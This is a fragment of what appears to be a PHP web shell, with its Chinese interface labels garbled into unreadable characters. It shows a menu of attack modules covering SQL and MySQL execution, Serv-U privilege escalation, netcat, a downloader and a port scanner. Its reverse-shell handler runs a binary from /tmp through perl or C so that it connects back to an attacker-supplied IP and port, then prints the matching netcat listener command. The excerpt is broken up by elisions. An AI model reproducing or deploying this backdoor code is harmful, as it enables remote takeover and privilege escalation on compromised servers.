...
"��Ȩ����" => array("sqlshell" => "ִ��SQLִ��","mysql_exec" => "MYSQL����","myexp" => "MYSQL��Ȩ","servu" => "Serv-U��Ȩ","nc" => "NC����","linux" => "Linux����","downloader" => "�ļ�����","port" => "�˿�ɨ��"),
...
switch($eanver){
	...
	html_n("<li><a title='��ɱ����' href='http://caidaome.com' target=\"main\">��ɱ����</a></li>");
...
END;
	if((!empty($_POST['yourip'])) && (!empty($_POST['yourport'])))
	{
		...
		if($_POST['use'] == 'perl')
		{
			...
			echo Exec_Run($perlpath.' /tmp/envl_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'ִ������ʧ��';
		}
		if($_POST['use'] == 'c')
		{
			...
			echo Exec_Run('/tmp/envl_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'ִ������ʧ��';
		}
